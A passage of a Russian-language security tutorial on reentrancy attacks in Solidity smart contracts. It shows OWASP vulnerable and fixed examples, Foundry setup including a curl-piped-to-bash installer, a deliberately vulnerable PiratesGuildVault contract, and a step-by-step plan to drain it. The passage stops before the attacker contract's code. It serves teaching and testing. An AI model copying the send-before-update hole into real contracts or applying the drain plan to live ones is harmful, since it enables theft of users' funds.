@@ -1,0 +1,1571 @@
+<article class="markdown-body entry-content container-lg" itemprop="text">
+ <div class="markdown-heading" dir="auto">
+  <h1 class="heading-element" dir="auto" tabindex="-1">
+   Атаки реентерабельности в смарт-контрактах SC05:2025 -
+            Reentrancy
+  </h1>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   Введение
+  </h2>
+ </div>
+ <p dir="auto">
+  <strong>
+   Атака повторного входа (Reentrancy)
+  </strong>
+  эксплуатирует уязвимость в смарт-контрактах,
+        возникающую тогда, когда контракт выполняет внешний вызов другому контракту до того, как обновит собственное
+        состояние.
+        Это позволяет внешнему (возможно, злонамеренному) контракту повторно вызвать оригинальную функцию и многократно
+        выполнить критические действия, например, вывести средства, используя старое состояние.
+        Такая атака может привести к полному опустошению баланса смарт-контракта. Она является одна из самых известных
+        уязвимостей в Web3-пространстве, часто приводящая к катастрофическим потерям средств в смарт‑контрактах.
+        Эта глава посвящена пониманию, тестированию и автоматизации обнаружения таких уязвимостей с помощью Foundry,
+        мощного Solidity‑фреймворка.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Что мы обсудим в этой статье
+  </h3>
+ </div>
+ <ol dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Понимание атак реентерабельности:
+    </strong>
+    Мы рассмотрим, что такое реентерабельность,
+                включая ее механику и разрушительные последствия,
+                к которым она может привести, если с ней не бороться. В том числе мы подробно рассмотрим функции
+                fallback и receive,
+                которые часто играют очень важную роль в реализации таких атак.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Уязвимый контракт:
+    </strong>
+    Мы проанализируем контракт PiratesGuildVault, который
+                содержит достаточно тонкую, но критическую уязвимость.
+                Мы препарируем его логику и поймем, почему его реализация склонна к реентерабельности.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Вредоносный контракт:
+    </strong>
+    Далее мы рассмотрим контракт злоумышленника
+                TheTraitorWithin, специально разработанный для эксплуатации уязвимого хранилища.
+                Этот контракт имитирует реальные вредоносные стратегии, используемые в атаках реентерабельности.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Автоматизированное тестирование с помощью Foundry:
+    </strong>
+    Тестирование — это
+                краеугольный камень разработки защищенных смарт‑контрактов. В этом разделе вы узнаете,
+                как смоделировать атаку реентерабельности с помощью Foundry, автоматизировать процесс тестирования и
+                проанализировать результаты.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Распространенные проблемы и их устранение:
+    </strong>
+    После наблюдения за непройденными
+                тестами мы обсудим первопричину этих проблем, в том числе почему атака приводит к исключениям,
+                когда хранилище пусто. Вы увидите, что обработка пограничных ситуаций, хоть и важна для тестирования, но
+                не устраняет саму уязвимость, а лишь помогает тестам работать без сбоев.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Ключевые выводы для разработчиков:
+    </strong>
+   </p>
+   <ul dir="auto">
+    <li>
+     <p dir="auto">
+      Всегда обновляйте внутренние балансы перед переводом эфира.
+     </p>
+    </li>
+    <li>
+     <p dir="auto">
+      Остерегайтесь непредвиденной рекурсии через функции fallback или receive.
+     </p>
+    </li>
+    <li>
+     <p dir="auto">
+      Автоматизируйте тесты, чтобы выявить такие уязвимости, как реентерабельность, на
+                        ранних этапах разработки.
+     </p>
+    </li>
+   </ul>
+  </li>
+ </ol>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Что такое уязвимость реентерабельности в Web3?
+  </h3>
+ </div>
+ <p dir="auto">
+  Реентерабельность (reentrancy) — одна из самых известных уязвимостей при разработке смарт‑контрактов,
+        особенно на Ethereum и других блокчейнах, использующих виртуальную машину Ethereum (EVM).
+        Эта уязвимость позволяет злоумышленнику эксплуатировать контракт, неоднократно возвращаясь к нему до завершения
+        предыдущего выполнения, что часто приводит к неожиданному поведению или, что еще хуже, к похищению средств.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Как работает реентерабельность?
+  </h4>
+ </div>
+ <p dir="auto">
+  По своей сути, уязвимость реентерабельности возникает, когда контракт переводит эфир на другой адрес
+        до полного обновления своего внутреннего состояния.
+        Это позволяет получателю, обычно вредоносному контракту, выполнить свою собственную логику и снова войти в
+        функцию оригинального контракта, нарушив надлежащий поток его выполнения.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Алгоритм атаки реентерабельности:
+  </h4>
+ </div>
+ <p dir="auto">
+  <strong>
+   Уязвимый контракт (VulnerableContract) позволяет выводить эфир.
+  </strong>
+  Пользователь может
+        внести эфир в контракт, а затем вывести свой баланс с помощью функции withdraw.
+ </p>
+ <p dir="auto">
+  <strong>
+   Злоумышленник развертывает вредоносный контракт (MaliciousContract).
+  </strong>
+  Этот контракт
+        предназначен для эксплуатации VulnerableContract путем многократного вызова функции withdraw до завершения его
+        выполнения.
+ </p>
+ <p dir="auto">
+  <strong>
+   Начало атаки.
+  </strong>
+  Атакующий вызывает withdraw на VulnerableContract. Вместо того чтобы
+        просто перевести эфир и завершить транзакцию, MaliciousContract выполняет свою функцию fallback или receive для
+        повторного ввода withdraw.
+ </p>
+ <p dir="auto">
+  <strong>
+   Средства сливаются.
+  </strong>
+  Поскольку VulnerableContract еще не обновил баланс
+        злоумышленника, этот процесс может повторяться до тех пор, пока баланс эфира уязвимого контракта не будет
+        исчерпан.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Что такое функция fallback?
+  </h4>
+ </div>
+ <p dir="auto">
+  В Solidity функция fallback — это специальная безымянная функция, которая запускается, когда:
+ </p>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    Контракт получает эфир, но не имеет функции receive.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    Вызов функции не соответствует ни одной из функций в контракте.
+   </p>
+  </li>
+ </ul>
+ <p dir="auto">
+  Функция fallback выступает в роли «палочки‑выручалочки» и позволяет контрактам обрабатывать
+        неожиданные переводы эфира или вызовы неизвестных функций.
+        В контексте реентерабельности функции fallback часто используются во вредоносных контрактах для повторного входа
+        в уязвимый контракт.
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-c">// Простой контракт с функцией fallbackn</span>
+    <span class="pl-k">contract</span> <span class="pl-en">Example</span> {
+        <span class="pl-k">fallback</span>() <span class="pl-k">external</span> <span class="pl-k">payable</span> {
+            <span class="pl-c">// Логика для обработки неожиданных вызовов или перевода эфира</span>
+    
+        }
+    }</pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Чем receive отличается от fallback?
+  </h4>
+ </div>
+ <ul dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     receive:
+    </strong>
+    представлена в Solidity 0.6.0, срабатывает, когда контракт получает
+                простой эфир (без calldata).
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     fallback:
+    </strong>
+    срабатывает, когда вызов функции не совпадает ни с одной
+                существующей функцией, или когда эфир отправляется с calldata, но соответствующей функции не существует.
+   </p>
+  </li>
+ </ul>
+ <p dir="auto">
+  Если контракт имеет функции receive и fallback, функция receive будет более приоритетной, если эфир
+        отправляется без calldata.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Пример приведенный на OWASP Top 10 (уязвимый контракт)
+  </h3>
+ </div>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-c">// SPDX-License-Identifier: MIT</span>
+    <span class="pl-k">pragma solidity</span> <span class="pl-k">^</span><span class="pl-c1">0.8.0</span>;
+    
+    <span class="pl-k">contract</span> <span class="pl-en">Solidity_Reentrancy</span> {
+        <span class="pl-k">mapping</span>(<span class="pl-c1">address</span> <span class="pl-k">=&gt;</span> <span class="pl-c1">uint</span>) <span class="pl-k">public</span> balances;
+    
+        <span class="pl-k">function<span class="pl-en"> deposit</span></span>() <span class="pl-k">external</span> <span class="pl-k">payable</span> {
+            balances[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>] <span class="pl-k">+=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>;
+        }
+    
+        <span class="pl-k">function<span class="pl-en"> withdraw</span></span>() <span class="pl-k">external</span> {
+            <span class="pl-c1">uint</span> amount <span class="pl-k">=</span> balances[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>];
+            <span class="pl-k">require</span>(amount <span class="pl-k">&gt;</span> <span class="pl-c1">0</span>, <span class="pl-s">"<span class="pl-s">Insufficient balance</span>"</span>);
+    
+            <span class="pl-c">// Уязвимость: перевод средств происходит до обновления баланса.</span>
+            (<span class="pl-c1">bool</span> <span class="pl-v">success</span>, ) <span class="pl-k">=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>.<span class="pl-c1">call</span>{value: amount}(<span class="pl-s">""</span>);
+            <span class="pl-k">require</span>(success, <span class="pl-s">"<span class="pl-s">Transfer failed</span>"</span>);
+    
+            <span class="pl-c">// Баланс обновляется после перевода средств.</span>
+            balances[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>] <span class="pl-k">=</span> <span class="pl-c1">0</span>;
+        }
+    }</pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Последствия
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   Основной и наиболее опасный эффект — это возможность вывести больше средств, чем положено, что может
+            привести к полному опустошению контракта.
+  </li>
+  <li>
+   Злоумышленник может инициировать несанкционированные вызовы других функций, что приводит к непредсказуемым
+            последствиям и дополнительным уязвимостям в экосистеме.
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Ремедиация
+  </h3>
+ </div>
+ <ul dir="auto">
+  <li>
+   Соблюдайте шаблон "checks-effects-interactions": обновляйте внутреннее состояние до вызова внешних
+            контрактов.
+  </li>
+  <li>
+   Используйте модификаторы и защитные шаблоны, например
+   <code>
+    ReentrancyGuard
+   </code>
+   из OpenZeppelin.
+  </li>
+  <li>
+   Минимизируйте использование
+   <code>
+    call
+   </code>
+   и используйте более безопасные методы вроде
+   <code>
+    transfer
+   </code>
+   или
+   <code>
+    send
+   </code>
+   (при условии соблюдения ограничений по газу).
+  </li>
+ </ul>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Пример риведенный на OWASP Top 10 (безопасная версия)
+  </h3>
+ </div>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-c">// SPDX-License-Identifier: MIT</span>
+    <span class="pl-k">pragma solidity</span> <span class="pl-k">^</span><span class="pl-c1">0.8.0</span>;
+    
+    <span class="pl-k">contract</span> <span class="pl-en">Solidity_Reentrancy</span> {
+        <span class="pl-k">mapping</span>(<span class="pl-c1">address</span> <span class="pl-k">=&gt;</span> <span class="pl-c1">uint</span>) <span class="pl-k">public</span> balances;
+    
+        <span class="pl-k">function<span class="pl-en"> deposit</span></span>() <span class="pl-k">external</span> <span class="pl-k">payable</span> {
+            balances[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>] <span class="pl-k">+=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>;
+        }
+    
+        <span class="pl-k">function<span class="pl-en"> withdraw</span></span>() <span class="pl-k">external</span> {
+            <span class="pl-c1">uint</span> amount <span class="pl-k">=</span> balances[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>];
+            <span class="pl-k">require</span>(amount <span class="pl-k">&gt;</span> <span class="pl-c1">0</span>, <span class="pl-s">"<span class="pl-s">Insufficient balance</span>"</span>);
+    
+            <span class="pl-c">// Исправление: сначала обновляем баланс.</span>
+            balances[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>] <span class="pl-k">=</span> <span class="pl-c1">0</span>;
+    
+            <span class="pl-c">// Затем выполняем перевод средств.</span>
+            (<span class="pl-c1">bool</span> <span class="pl-v">success</span>, ) <span class="pl-k">=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>.<span class="pl-c1">call</span>{value: amount}(<span class="pl-s">""</span>);
+            <span class="pl-k">require</span>(success, <span class="pl-s">"<span class="pl-s">Transfer failed</span>"</span>);
+        }
+    }</pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h2 class="heading-element" dir="auto" tabindex="-1">
+   Практическая часть
+  </h2>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Изучение реентерабельности с помощью Foundry
+  </h3>
+ </div>
+ <p dir="auto">
+  Foundry — это мощный фреймворк для разработки Ethereum, который набирает популярность благодаря своей
+        скорости, простоте и ориентированности на тестирование на основе Solidity.
+        По мере того как он распространяется, становится все более важным с точки зрения безопасности понимать, как он
+        работает. Он предлагает отличную среду для анализа и экспериментов с уязвимостями вроде реентерабельности,
+        что делает его обязательным инструментом для энтузиастов и профессионалов в области безопасности.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Установка Foundry
+  </h4>
+ </div>
+ <p dir="auto">
+  Foundry предоставляет инструмент командной строки под названием forge, который является ядром
+        фреймворка. Установка Foundry проста и доступна для большинства платформ.
+ </p>
+ <ol dir="auto">
+  <li>
+   <strong>
+    Установка Foundryup:
+   </strong>
+   Foundryup — это программа установки и менеджер версий для Foundry.
+            Чтобы установить его, откройте терминал и выполните следующую команду:
+  </li>
+ </ol>
+ <p dir="auto">
+  <code>
+   curl -L https://foundry.paradigm.xyz | bash
+  </code>
+  После установки вам нужно будет добавить foundryup в PATH:
+ </p>
+ <p dir="auto">
+  <code>
+   source ~/.bashrc    # or ~/.zshrc, depending on your shell
+  </code>
+  2.
+  <strong>
+   Установка Foundry:
+  </strong>
+  После установки Foundryup вы можете установить Foundry, выполнив команду:
+ </p>
+ <p dir="auto">
+  <code>
+   foundryup
+  </code>
+  Это установит forge (инструмент для тестирования и компиляции) и cast (утилита для взаимодействия с Ethereum).
+ </p>
+ <ol dir="auto" start="3">
+  <li>
+   <strong>
+    Проверка инсталляции:
+   </strong>
+   Проверьте, что Foundry установлен, запустив программу:
+  </li>
+ </ol>
+ <p dir="auto">
+  <code>
+   forge --version
+  </code>
+  Вы должны увидеть версию установленного Forge.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Настройка проекта
+  </h4>
+ </div>
+ <p dir="auto">
+  Теперь, когда Foundry установлен, давайте подготовим новый проект, в котором мы будем создавать и
+        тестировать наши контракты.
+ </p>
+ <ol dir="auto">
+  <li>
+   <strong>
+    Инициализация проекта Foundry:
+   </strong>
+   Используйте следующую команду для создания нового проекта:
+  </li>
+ </ol>
+ <p dir="auto">
+  <code>
+   forge init BountyVault
+  </code>
+  Это создаст каталог с именем BountyVault со следующей структурой папок:
+ </p>
+ <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+  <pre class="notranslate"><code>BountyVault/
+    ├── src/
+    │   └── Counter.sol    # Контракт по умолчанию
+    ├── test/
+    │   └── Counter.t.sol  # Тестовый файл по умолчанию
+    ├── foundry.toml       # Конфигурационный файл
+    </code></pre>
+ </div>
+ <ol dir="auto" start="2">
+  <li>
+   <strong>
+    Структура проекта:
+   </strong>
+   Добавьте в папки src/ и test/ свои контракты и тесты. Для нашего примера
+            с реентерабельностью:
+  </li>
+ </ol>
+ <div class="snippet-clipboard-content notranslate position-relative overflow-auto">
+  <pre class="notranslate"><code>BountyVault/
+    ├── src/
+    │   ├── PiratesGuildVault.sol
+    │   ├── TheTraitorWithin.sol
+    ├── test/
+    │   └── ReentrancyExploit.t.sol
+    ├── foundry.toml
+    </code></pre>
+ </div>
+ <ol dir="auto" start="3">
+  <li>
+   <strong>
+    Скомпилируйте контракты:
+   </strong>
+   Скомпилируйте контракты с помощью:
+  </li>
+ </ol>
+ <p dir="auto">
+  <code>
+   forge build
+  </code>
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Разбор нашего контракта Pirate's Guild Vault
+  </h3>
+ </div>
+ <p dir="auto">
+  <strong>
+   Pirate's Guild Vault
+  </strong>
+  (сокровищница пиратской гильдии) — это смарт‑контракт Solidity,
+        который служит общим хранилищем эфира,
+        доступным только зарегистрированным членам вымышленной пиратской гильдии. Его структура вращается вокруг трех
+        основных функций: вступление в гильдию, внесение сокровищ и вывод средств.
+        Давайте рассмотрим его структуру и функционал.
+ </p>
+ <p dir="auto">
+  Уязвимый контракт
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">pragma solidity</span> <span class="pl-k">^</span><span class="pl-c1">0.8.0</span>;
+    
+    <span class="pl-c">/**</span>
+    <span class="pl-c"> * @title Pirate's Guild Vault</span>
+    <span class="pl-c"> * @notice Общая сокровищница членов пиратской гильдии, куда они могут вносить, а затем забирать свои сокровища.</span>
+    <span class="pl-c"> */</span>
+    <span class="pl-k">contract</span> <span class="pl-en">PiratesGuildVault</span> {
+        <span class="pl-k">struct<span class="pl-en"> Member</span></span> {
+            <span class="pl-c1">uint256</span> balance;
+            <span class="pl-c1">bool</span> isMember;
+        }
+    
+        <span class="pl-k">mapping</span>(<span class="pl-c1">address</span> <span class="pl-k">=&gt;</span> Member) <span class="pl-k">private</span> guildMembers;
+        <span class="pl-c1">uint256</span> <span class="pl-k">public</span> totalVaultBalance;
+    
+        <span class="pl-k">modifier<span class="pl-en"> onlyMembers</span></span>() {
+            <span class="pl-k">require</span>(
+                guildMembers[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>].isMember,
+                <span class="pl-s">"<span class="pl-s">Only guild members can access the vault!</span>"</span>
+            );
+            <span class="pl-k">_;</span>
+        }
+    
+        <span class="pl-c">/**</span>
+    <span class="pl-c">     * @dev Вступление в гильдию, став ее членом.</span>
+    <span class="pl-c">     */</span>
+        <span class="pl-k">function<span class="pl-en"> joinGuild</span></span>() <span class="pl-k">external</span> {
+            <span class="pl-k">require</span>(
+                <span class="pl-k">!</span>guildMembers[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>].isMember,
+                <span class="pl-s">"<span class="pl-s">You are already a member of the guild!</span>"</span>
+            );
+    
+            guildMembers[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>] <span class="pl-k">=</span> <span class="pl-en">Member</span>({balance: <span class="pl-c1">0</span>, isMember: <span class="pl-c1">true</span>});
+        }
+    
+        <span class="pl-c">/**</span>
+    <span class="pl-c">     * @dev Добавление эфира в общую сокровищницу гильдии.</span>
+    <span class="pl-c">     */</span>
+        <span class="pl-k">function<span class="pl-en"> deposit</span></span>() <span class="pl-k">external</span> <span class="pl-k">payable</span> onlyMembers {
+            <span class="pl-k">require</span>(<span class="pl-c1">msg</span>.<span class="pl-c1">value</span> <span class="pl-k">&gt;</span> <span class="pl-c1">0</span>, <span class="pl-s">"<span class="pl-s">You must deposit some treasure!</span>"</span>);
+    
+            guildMembers[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>].balance <span class="pl-k">+=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>;
+            totalVaultBalance <span class="pl-k">+=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>;
+        }
+    
+        <span class="pl-c">/**</span>
+    <span class="pl-c">     * @dev Вывод эфир со счета гильдии.</span>
+    <span class="pl-c">     */</span>
+        <span class="pl-k">function<span class="pl-en"> withdraw</span></span>(<span class="pl-c1">uint256</span> <span class="pl-v">amount</span>) <span class="pl-k">external</span> onlyMembers {
+            Member <span class="pl-k">storage</span> member <span class="pl-k">=</span> guildMembers[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>];
+            <span class="pl-k">require</span>(amount <span class="pl-k">&gt;</span> <span class="pl-c1">0</span>, <span class="pl-s">"<span class="pl-s">Withdrawal amount must be greater than zero!</span>"</span>);
+            <span class="pl-k">require</span>(
+                member.balance <span class="pl-k">&gt;=</span> amount,
+                <span class="pl-s">"<span class="pl-s">Not enough balance in your treasure account!</span>"</span>
+            );
+    
+            <span class="pl-c">// Уязвимость: Эфир отправляется до обновления баланса</span>
+            (<span class="pl-c1">bool</span> <span class="pl-v">success</span>, ) <span class="pl-k">=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>.<span class="pl-c1">call</span>{value: amount}(<span class="pl-s">""</span>);
+            <span class="pl-k">require</span>(success, <span class="pl-s">"<span class="pl-s">Failed to send Ether!</span>"</span>);
+            member.balance <span class="pl-k">-=</span> amount;
+            totalVaultBalance <span class="pl-k">-=</span> amount;
+            
+        }
+    
+        <span class="pl-c">/**</span>
+    <span class="pl-c">     * @dev Функция fallback для приема эфира.</span>
+    <span class="pl-c">     */</span>
+        <span class="pl-k">receive</span>() <span class="pl-k">external</span> <span class="pl-k">payable</span> {
+            totalVaultBalance <span class="pl-k">+=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>;
+        }
+    }</pre>
+ </div>
+ <p dir="auto">
+  В основе контракта лежит структура Member, представляющая отдельных членов гильдии. Каждый Member
+        имеет два атрибута: баланс эфира и статус членства.
+        Эти данные хранятся в mapping, которая привязывает адреса Ethereum к записям членов. Кроме того, контракт
+        отслеживает общее количество эфира, хранящегося в хранилище, посредством переменной totalVaultBalance.
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">struct<span class="pl-en"> Member</span></span> {
+        <span class="pl-c1">uint256</span> balance;
+        <span class="pl-c1">bool</span> isMember;
+    }
+    
+    <span class="pl-k">mapping</span>(<span class="pl-c1">address</span> <span class="pl-k">=&gt;</span> Member) <span class="pl-k">private</span> guildMembers;
+    <span class="pl-c1">uint256</span> <span class="pl-k">public</span> totalVaultBalance;</pre>
+ </div>
+ <p dir="auto">
+  Чтобы обеспечить эксклюзивность гильдии, введен модификатор OnlyMembers. Этот модификатор гарантирует,
+        что только зарегистрированные члены гильдии могут выполнять определенные функции.
+        Если к этим функциям попытается получить доступ не член гильдии, контракт выдаст сообщение об ошибке.
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">modifier<span class="pl-en"> onlyMembers</span></span>() {
+        <span class="pl-k">require</span>(
+            guildMembers[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>].isMember,
+            <span class="pl-s">"<span class="pl-s">Only guild members can access the vault!</span>"</span>
+        );
+        <span class="pl-k">_;</span>
+    }</pre>
+ </div>
+ <p dir="auto">
+  Управление членством осуществляется с помощью функции joinGuild. Эта функция позволяет адресу
+        зарегистрироваться в качестве члена гильдии, если он еще не состоит в ней.
+        После добавления адрес инициализируется с нулевым балансом и помечается как член гильдии.
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">function<span class="pl-en"> joinGuild</span></span>() <span class="pl-k">external</span> {
+        <span class="pl-k">require</span>(
+            <span class="pl-k">!</span>guildMembers[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>].isMember,
+            <span class="pl-s">"<span class="pl-s">You are already a member of the guild!</span>"</span>
+        );
+    
+        guildMembers[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>] <span class="pl-k">=</span> <span class="pl-en">Member</span>({balance: <span class="pl-c1">0</span>, isMember: <span class="pl-c1">true</span>});
+    }</pre>
+ </div>
+ <p dir="auto">
+  Члены гильдии могут внести свой вклад в общую сокровищницу, добавляя туда эфир. Функция deposit
+        гарантирует, что только члены гильдии могут вносить средства.
+        Она также проверяет, что сумма вклада больше нуля, а затем обновляет баланс члена гильдии и общий баланс
+        сокровищницы. Эта функция играет важную роль в поддержании целостности общего хранилища.
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">function<span class="pl-en"> deposit</span></span>() <span class="pl-k">external</span> <span class="pl-k">payable</span> onlyMembers {
+        <span class="pl-k">require</span>(<span class="pl-c1">msg</span>.<span class="pl-c1">value</span> <span class="pl-k">&gt;</span> <span class="pl-c1">0</span>, <span class="pl-s">"<span class="pl-s">You must deposit some treasure!</span>"</span>);
+    
+        guildMembers[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>].balance <span class="pl-k">+=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>;
+        totalVaultBalance <span class="pl-k">+=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>;
+    }</pre>
+ </div>
+ <p dir="auto">
+  Вывод сокровищ не менее важен, чем их ввод. Функция withdraw позволяет членам гильдии получить
+        внесенный ими эфир. Эта функция проверяет, что сумма вывода валидна и что у пользователя достаточно средств.
+        Эфир переводится члену гильдии, а затем уже обновляется баланс.
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">function<span class="pl-en"> withdraw</span></span>(<span class="pl-c1">uint256</span> <span class="pl-v">amount</span>) <span class="pl-k">external</span> onlyMembers {
+        Member <span class="pl-k">storage</span> member <span class="pl-k">=</span> guildMembers[<span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>];
+        <span class="pl-k">require</span>(amount <span class="pl-k">&gt;</span> <span class="pl-c1">0</span>, <span class="pl-s">"<span class="pl-s">Withdrawal amount must be greater than zero!</span>"</span>);
+        <span class="pl-k">require</span>(
+            member.balance <span class="pl-k">&gt;=</span> amount,
+            <span class="pl-s">"<span class="pl-s">Not enough balance in your treasure account!</span>"</span>
+        );
+    
+        (<span class="pl-c1">bool</span> <span class="pl-v">success</span>, ) <span class="pl-k">=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">sender</span>.<span class="pl-c1">call</span>{value: amount}(<span class="pl-s">""</span>);
+        <span class="pl-k">require</span>(success, <span class="pl-s">"<span class="pl-s">Failed to send Ether!</span>"</span>);
+        member.balance <span class="pl-k">-=</span> amount;
+        totalVaultBalance <span class="pl-k">-=</span> amount;
+    }</pre>
+ </div>
+ <p dir="auto">
+  Наконец, контракт может получать эфир напрямую через свою функцию receive. Эта функция срабатывает
+        всякий раз, когда эфир отправляется на адрес контракта без указания какой‑либо функции.
+        Это гарантирует, что сокровищница сможет принимать средства даже вне структурированных депозитов.
+ </p>
+ <div class="highlight highlight-source-solidity notranslate position-relative overflow-auto" dir="auto">
+  <pre><span class="pl-k">receive</span>() <span class="pl-k">external</span> <span class="pl-k">payable</span> {
+        totalVaultBalance <span class="pl-k">+=</span> <span class="pl-c1">msg</span>.<span class="pl-c1">value</span>;
+    }</pre>
+ </div>
+ <div class="markdown-heading" dir="auto">
+  <h3 class="heading-element" dir="auto" tabindex="-1">
+   Стратегия использования уязвимости сокровищницы
+  </h3>
+ </div>
+ <p dir="auto">
+  Чтобы воспользоваться уязвимостью в сокровищнице гильдии пиратов, мы используем классическую атаку
+        реентерабельности.
+        Эта атака манипулирует последовательностью операций в функции withdraw, позволяя нам неоднократно выводить
+        средства до того, как контракт обновит баланс пользователя.
+        Используя этот недостаток, злоумышленник может украсть из сокровищницы весь эфир. В этом разделе мы разберем
+        стратегию и представим вредоносный контракт, выполняющий атаку.
+ </p>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   План использования уязвимости
+  </h4>
+ </div>
+ <p dir="auto">
+  Атака реентерабельности основана на критической ошибке в функции withdraw сокровищницы. В частности,
+        перевод эфира пользователю происходит до обновления его баланса.
+        Такая последовательность позволяет злоумышленнику реализовать следующую стратегию:
+ </p>
+ <ol dir="auto">
+  <li>
+   <p dir="auto">
+    <strong>
+     Проникновение:
+    </strong>
+    Злоумышленник сначала регистрируется как легитимный член
+                гильдии, используя функцию joinGuild в сокровищнице.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Подготовка:
+    </strong>
+    Злоумышленник вносит в сокровищницу небольшое количество эфира
+                (например, 1 ETH), чтобы обеспечить себе баланс для вывода средств.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Триггер:
+    </strong>
+    Злоумышленник вызывает функцию withdraw, чтобы вывести внесенный им
+                эфир. Когда эфир отправляется злоумышленнику, срабатывает функция receive сокровищницы.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Реентерабельность:
+    </strong>
+    Вместо того чтобы просто получить эфир, злоумышленник
+                использует функцию receive для повторного вызова withdraw, повторяя контракт с сокровищницей, прежде чем
+                баланс будет обновлен. Этот процесс повторяется в цикле, опустошая сокровищницу по частям.
+   </p>
+  </li>
+  <li>
+   <p dir="auto">
+    <strong>
+     Очистка:
+    </strong>
+    Как только сокровищница опустеет, злоумышленник останавливает цикл
+                реентерабельности и забирает украденный эфир.
+   </p>
+  </li>
+ </ol>
+ <div class="markdown-heading" dir="auto">
+  <h4 class="heading-element" dir="auto" tabindex="-1">
+   Вредоносный контракт: TheTraitorWithin
+  </h4>
+ </div>
+ <p dir="auto">
+  Для осуществления этой атаки мы развернули специализированный вредоносный контракт под названием
+        TheTraitorWithin. Ниже приведено описание его компонентов и функционала.
+ </p>
+ <p dir="auto">
+  Вредоносный контракт
+ </p>
